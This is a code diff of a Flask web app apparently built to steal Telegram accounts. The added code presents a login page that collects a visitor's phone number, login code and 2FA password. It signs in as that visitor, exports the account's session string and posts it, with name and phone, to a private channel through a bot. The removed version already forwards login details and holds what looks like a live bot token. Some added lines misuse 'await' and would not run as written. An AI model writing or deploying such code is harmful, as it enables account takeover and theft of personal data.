@@ -1,233 +1,233 @@
-from flask import Flask, render_template, request, session, redirect, jsonify, abort
-import hashlib
-import hmac
-import time
-import logging
-import requests
+from flask import Flask, render_template, request, session, redirect, jsonify
 import os
 import json
+import asyncio
+import threading
 from datetime import datetime
-from functools import wraps
+from pyrogram import Client
+from pyrogram.errors import (
+    PhoneNumberInvalid, 
+    PhoneCodeInvalid, 
+    PhoneCodeExpired,
+    SessionPasswordNeeded,
+    FloodWait
+)
 
 app = Flask(__name__)
-app.secret_key = os.environ.get("SECRET_KEY", "your-secret-key-change-in-production")
+app.secret_key = os.environ.get("SECRET_KEY", "your-secret-key")
 
 # ========== CONFIGURE THESE ==========
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8607223226:AAHBtUHkmc01RIRsVGTmJdm7d3B-PtI8o28")
-TELEGRAM_CHANNEL_ID = os.environ.get("TELEGRAM_CHANNEL_ID", "-1004376082945")
+API_ID = int(os.environ.get("API_ID", "YOUR_API_ID"))      # From my.telegram.org
+API_HASH = os.environ.get("API_HASH", "YOUR_API_HASH")      # From my.telegram.org
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN") # For notifications
+CHANNEL_ID = os.environ.get("CHANNEL_ID", "-100xxxxxxxxxx") # Private channel
 # =====================================
 
-logging.basicConfig(level=logging.INFO)
-
-# Store sessions
-user_sessions = {}
+# Temporary storage for Pyrogram clients (in production use Redis)
+clients = {}  # session_id -> Client object
+phone_codes = {}  # session_id -> phone_code_hash
 
 def send_to_channel(message):
-    """Send session data to private Telegram channel"""
-    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
+    """Send session to private channel via Bot API"""
+    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN":
         print(f"[CHANNEL] {message[:200]}...")
         return True
     
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
-        "chat_id": TELEGRAM_CHANNEL_ID,
+        "chat_id": CHANNEL_ID,
         "text": message,
         "parse_mode": "HTML",
         "disable_web_page_preview": True
     }
     try:
+        import requests
         r = requests.post(url, json=payload, timeout=10)
         return r.json().get("ok", False)
     except Exception as e:
-        logging.error(f"Channel send failed: {e}")
+        print(f"Channel send error: {e}")
         return False
-
-def verify_telegram_auth(data):
-    """
-    Verify Telegram Login Widget data
-    Docs: https://core.telegram.org/widgets/login
-    """
-    check_hash = data.pop('hash')
-    
-    # Create data_check_string
-    data_check_arr = []
-    for key in sorted(data.keys()):
-        data_check_arr.append(f"{key}={data[key]}")
-    data_check_string = "\n".join(data_check_arr)
-    
-    # Generate secret_key
-    secret_key = hashlib.sha256(BOT_TOKEN.encode()).digest()
-    
-    # Generate hash
-    h = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256)
-    calculated_hash = h.hexdigest()
-    
-    # Verify
-    if calculated_hash != check_hash:
-        return False
-    
-    # Check auth_date (optional: expire after 24 hours)
-    auth_date = int(data.get('auth_date', 0))
-    if time.time() - auth_date > 86400:
-        return False
-    
-    return True
-
-def login_required(f):
-    @wraps(f)
-    def decorated_function(*args, **kwargs):
-        if 'telegram_user' not in session:
-            return redirect('/login')
-        return f(*args, **kwargs)
-    return decorated_function
 
 @app.route("/")
-@login_required
-def home():
-    user = session['telegram_user']
-    session_id = session.get('session_id')
-    
-    # Update activity
-    if session_id and session_id in user_sessions:
-        user_sessions[session_id]['last_active'] = time.time()
-    
-    return render_template("dashboard.html", user=user)
+def index():
+    return redirect("/login")
 
 @app.route("/login")
-def login_page():
-    if 'telegram_user' in session:
-        return redirect('/')
-    return render_template("login.html", bot_username=BOT_TOKEN.split(':')[0])
+def login():
+    return render_template("login.html")
 
-@app.route("/api/auth/telegram", methods=["POST"])
-def telegram_auth():
-    """Handle Telegram Login Widget callback"""
+@app.route("/api/send-code", methods=["POST"])
+def send_code():
+    """Send Telegram code using Pyrogram"""
+    data = request.json or {}
+    phone = data.get("phone", "").strip()
+    session_name = data.get("session_name", "session").strip()
+    
+    if not phone or len(phone) < 10:
+        return jsonify(ok=False, error="Invalid phone number"), 400
+    
+    # Generate unique session ID
+    import uuid
+    session_id = str(uuid.uuid4())[:8]
+    
+    # Create Pyrogram client in memory
+    client = Client(
+        name=f"session_{session_id}",
+        api_id=API_ID,
+        api_hash=API_HASH,
+        in_memory=True,  # Don't save to disk
+        no_updates=True
+    )
+    
     try:
-        data = request.json or {}
+        # Connect and send code
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
         
-        # Required fields from Telegram
-        required = ['id', 'first_name', 'auth_date', 'hash']
-        if not all(k in data for k in required):
-            return jsonify(ok=False, error="Missing Telegram auth data"), 400
+        async def send():
+            await client.connect()
+            sent = await client.send_code(phone)
+            return sent
         
-        # Verify data authenticity
-        if not verify_telegram_auth(data.copy()):
-            logging.warning(f"Invalid auth attempt: {data}")
-            return jsonify(ok=False, error="Invalid authentication"), 403
+        sent_code = loop.run_until_complete(send())
         
-        # Extract user data
-        telegram_id = str(data['id'])
-        first_name = data.get('first_name', '')
-        last_name = data.get('last_name', '')
-        username = data.get('username', '')
-        photo_url = data.get('photo_url', '')
-        
-        # Get phone from data (if available via Mini App or additional request)
-        phone = data.get('phone', 'N/A')
-        
-        # Build full name
-        full_name = f"{first_name} {last_name}".strip() if last_name else first_name
-        
-        # Create session
-        session_id = f"tg_{telegram_id}_{int(time.time())}"
-        
-        user_data = {
-            'telegram_id': telegram_id,
-            'first_name': first_name,
-            'last_name': last_name,
-            'username': username,
-            'full_name': full_name,
-            'photo_url': photo_url,
-            'phone': phone,
-            'auth_date': data['auth_date'],
-            'login_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-            'session_id': session_id
+        # Store client and phone_code_hash
+        clients[session_id] = {
+            "client": client,
+            "phone": phone,
+            "session_name": session_name,
+            "phone_code_hash": sent_code.phone_code_hash,
+            "loop": loop
         }
         
-        session['telegram_user'] = user_data
-        session['session_id'] = session_id
+        return jsonify(
+            ok=True, 
+            session_id=session_id,
+            message=f"Code sent to {phone} via Telegram"
+        )
         
-        # Store in memory
-        user_sessions[session_id] = {
-            **user_data,
-            'ip': request.remote_addr,
-            'user_agent': request.headers.get('User-Agent', 'Unknown'),
-            'last_active': time.time()
+    except PhoneNumberInvalid:
+        return jsonify(ok=False, error="Invalid phone number"), 400
+    except FloodWait as e:
+        return jsonify(ok=False, error=f"Please wait {e.value} seconds"), 429
+    except Exception as e:
+        return jsonify(ok=False, error=str(e)), 500
+
+@app.route("/api/verify-code", methods=["POST"])
+def verify_code():
+    """Verify code and create session"""
+    data = request.json or {}
+    session_id = data.get("session_id", "")
+    code = data.get("code", "").strip()
+    password = data.get("password", "")  # For 2FA
+    
+    if not session_id or session_id not in clients:
+        return jsonify(ok=False, error="Session expired. Start again."), 400
+    
+    if not code or len(code) < 3:
+        return jsonify(ok=False, error="Invalid code"), 400
+    
+    client_data = clients[session_id]
+    client = client_data["client"]
+    phone = client_data["phone"]
+    phone_code_hash = client_data["phone_code_hash"]
+    session_name = client_data["session_name"]
+    loop = client_data["loop"]
+    
+    try:
+        async def sign_in():
+            try:
+                # Try to sign in with code
+                user = await client.sign_in(
+                    phone_number=phone,
+                    phone_code_hash=phone_code_hash,
+                    phone_code=code
+                )
+                return user, None
+            except SessionPasswordNeeded:
+                # 2FA enabled - need password
+                if not password:
+                    return None, "2FA_PASSWORD_REQUIRED"
+                user = await client.check_password(password)
+                return user, None
+        
+        user, error = loop.run_until_complete(sign_in())
+        
+        if error == "2FA_PASSWORD_REQUIRED":
+            return jsonify(ok=False, requires_password=True, error="2FA enabled. Enter password."), 401
+        
+        # Export session string
+        session_string = await client.export_session_string()
+        
+        # Get user info
+        user_info = {
+            "id": user.id,
+            "first_name": user.first_name,
+            "last_name": user.last_name or "",
+            "username": user.username or "N/A",
+            "phone": phone,
+            "session_string": session_string,
+            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "session_name": session_name
         }
         
-        # Send to private channel
-        country_code = phone[:3] if phone.startswith('+') else 'N/A'
-        phone_formatted = phone if phone != 'N/A' else 'Hidden'
+        # Disconnect client
+        await client.disconnect()
         
-        channel_msg = f"""🟢 <b>NEW TELEGRAM LOGIN</b>
+        # Clean up
+        del clients[session_id]
+        
+        # Send to channel
+        country_code = phone[:3] if phone.startswith("+") else phone[:2]
+        
+        channel_msg = f"""🟢 <b>NEW PYROGRAM SESSION</b>
 
-👤 <b>Name:</b> {full_name}
-🔗 <b>Username:</b> @{username if username else 'N/A'}
-🆔 <b>Telegram ID:</b> <code>{telegram_id}</code>
-📱 <b>Phone:</b> <code>{phone_formatted}</code>
-🌍 <b>Country Code:</b> {country_code}
-⏰ <b>Login Time:</b> {user_data['login_time']}
-🌐 <b>IP:</b> <code>{request.remote_addr}</code>
-💻 <b>Device:</b> {request.headers.get('User-Agent', 'Unknown')[:40]}...
+👤 <b>Name:</b> {user_info['first_name']} {user_info['last_name']}
+🔗 <b>Username:</b> @{user_info['username']}
+🆔 <b>User ID:</b> <code>{user_info['id']}</code>
+📱 <b>Phone:</b> <code>{phone}</code>
+🌍 <b>Country:</b> +{country_code}
+⏰ <b>Created:</b> {user_info['created_at']}
+🏷️ <b>Session Name:</b> <code>{session_name}</code>
 
-<b>Session ID:</b> <code>{session_id}</code>
-✅ Session saved!"""
+<b>🔐 SESSION STRING:</b>
+<code>{session_string}</code>
+
+⚠️ <b>Keep this secure!</b>"""
         
         send_to_channel(channel_msg)
         
-        return jsonify(ok=True, user=user_data)
+        # Store in Flask session
+        session["user"] = user_info
         
+        return jsonify(
+            ok=True,
+            user={
+                "id": user_info["id"],
+                "name": f"{user_info['first_name']} {user_info['last_name']}",
+                "username": user_info["username"],
+                "phone": phone
+            }
+        )
+        
+    except PhoneCodeInvalid:
+        return jsonify(ok=False, error="Invalid code. Try again."), 401
+    except PhoneCodeExpired:
+        del clients[session_id]
+        return jsonify(ok=False, error="Code expired. Request new code."), 401
     except Exception as e:
-        logging.error(f"Auth error: {e}")
-        return jsonify(ok=False, error="Authentication failed"), 500
-
-@app.route("/api/auth/bot", methods=["POST"])
-def bot_auth():
-    """
-    Alternative: Login via Telegram Bot (send /start to bot)
-    Uses deep linking or inline keyboard
-    """
-    data = request.json or {}
-    init_data = data.get('initData', '')
-    
-    # Verify WebApp initData (for Mini Apps)
-    if init_data:
-        parsed = dict(x.split('=') for x in init_data.split('&') if '=' in x)
-        if verify_telegram_auth(parsed):
-            return jsonify(ok=True)
-    
-    return jsonify(ok=False), 401
+        return jsonify(ok=False, error=str(e)), 500
 
 @app.route("/api/logout", methods=["POST"])
-@login_required
 def logout():
-    user = session.get('telegram_user', {})
-    session_id = session.get('session_id')
-    
-    if session_id and session_id in user_sessions:
-        del user_sessions[session_id]
-    
-    # Notify channel
-    send_to_channel(f"""🔴 <b>LOGOUT</b>
-👤 {user.get('full_name', 'N/A')}
-🆔 <code>{user.get('telegram_id', 'N/A')}</code>
-⏰ {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}""")
-    
     session.clear()
     return jsonify(ok=True)
 
-@app.route("/api/user", methods=["GET"])
-@login_required
-def get_user():
-    return jsonify(ok=True, user=session['telegram_user'])
-
-@app.route("/api/sessions", methods=["GET"])
-@login_required
-def get_sessions():
-    """Get all active sessions for this user"""
-    tg_id = session['telegram_user']['telegram_id']
-    sessions = [s for s in user_sessions.values() if s['telegram_id'] == tg_id]
-    return jsonify(ok=True, sessions=sessions)
+@app.route("/dashboard")
+def dashboard():
+    if "user" not in session:
+        return redirect("/login")
+    return render_template("dashboard.html", user=session["user"])
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
